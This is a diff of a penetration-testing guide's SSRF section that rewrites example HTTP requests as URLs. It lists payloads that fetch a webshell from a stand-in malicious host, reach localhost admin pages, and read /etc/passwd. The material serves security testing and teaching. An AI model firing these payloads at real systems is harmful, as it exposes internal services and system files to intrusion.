@@ -16,45 +16,20 @@ When testing for SSRF we are trying to trick the server into loading/writing uni
 
 Such internal systems often contain sensitive data or functionality.
 
-If we have the following request:
-
-```bash
-GET /page HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-
-page=about.php
-```
-
-We can try the following payloads:
+If we have the following request: `https://example.com/page?page=about.php`, we can try the following payloads.
 
 Return the content of an external resource like a webshell.
-
-```bash
-GET /page HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-
-page=https://malicioussite.com/shell.php
-```
+`https://example.com/page?page=https://malicioussite.com/shell.php`
 
 Use the localhost/loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
 
 These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF into a critical vulnerability.
 
-```bash
-GET /page HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-
-page=http://localhost/admin  #Alternative http://127.0.0.1/admin
-```
+`https://example.com/page?page=http://localhost/admin` or `https://example.com/page?page=http://127.0.0.1/admin`
 
 Fetch a local file
 
-```bash
-GET /page HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-
-page=file:///etc/passwd
-```
+`https://example.com/page?page=file:///etc/passwd`
 
 All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
 One important note on SSRF with POST requests is that the SSRF may also manifest in a Blind manner, because the application might not return anything immediately, that data might be used in other functionality such as PDF reports, invoice/order handling, etc. which are visible to employees/staff but not necessarily the end user or tester.
